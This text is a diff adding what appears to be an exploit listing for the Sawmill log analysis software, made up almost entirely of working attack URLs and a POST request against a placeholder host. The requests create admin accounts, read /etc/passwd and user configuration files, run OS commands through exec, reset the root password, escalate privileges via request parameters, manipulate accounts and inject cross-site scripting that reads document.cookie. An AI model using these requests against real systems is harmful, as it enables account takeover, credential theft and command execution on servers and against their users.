@@ -1,0 +1,41 @@
+* Create a user account with admin rights:
+http://www.example.com/?a=cu&u=testing&pw=testing&roles=role_1
+
+* Read files of the file system:
+http://www.example.com/?a=ee&exp=error(read_file('/etc/passwd'))
+http://www.example.com/?a=ee&exp=error(read_file('LogAnalysisInfo/users.cfg'))
+
+* Execute OS commands:
+http://www.example.com/?a=ee&exp=exec('/bin/ls','Output',1))
+
+* Access to the "new profile wizard"
+http://www.example.com/?dp+templates.new_profile_wizard.index
+
+* Access the Sawmill setup page to reset Sawmill root password:
+http://www.example.com/?dp=templates.setup
+
+* Gain sensitive information, such as config/user settings:
+http://www.example.com/?dp=templates.admin_pages.users.get_data&v.fp.is_root_admin=true&v.fp.is_unlimited_grants=true
+
+* Manipulate/create/delete user accounts:
+  POST /?dp+templates.admin_pages.users.save_data 
+  Host: www.example.com
+
+  v.fp.is_enterprise=true
+  &v.fp.deleted_users=
+  &v.fp.users.user_1.is_new=false
+  &v.fp.users.user_1.username=xxxxx
+  &v.fp.users.user_1.password=
+  &v.fp.users.user_1.language=
+  &v.fp.users.user_1.created_by_user=root_admin
+  &v.fp.users.user_1.access.0.all_profiles=false
+  &v.fp.users.user_1.access.0.created_by_user=root_admin
+  &v.fp.users.user_1.access.0.profiles=testprofile
+  &v.fp.users.user_1.access.0.roles.0=role_2
+  &v.fp.users.user_1.auto_direct_to_reports_after_login=false
+  &v.fp.users.user_1.report_filters.all_profiles.filter_expression=
+  [...]
+
+http://www.example.com/?dp=reports&p=testprofile&wbsi=";alert(document.cookie);//
+http://www.example.com/?dp=reports&p=testprofile&rii=";alert(123);//&wbsi=1279796468489657
+http://www.example.com/?dp=printer_friendly_report&%253cscript%253ealert%281%29%253c/script%253e=1
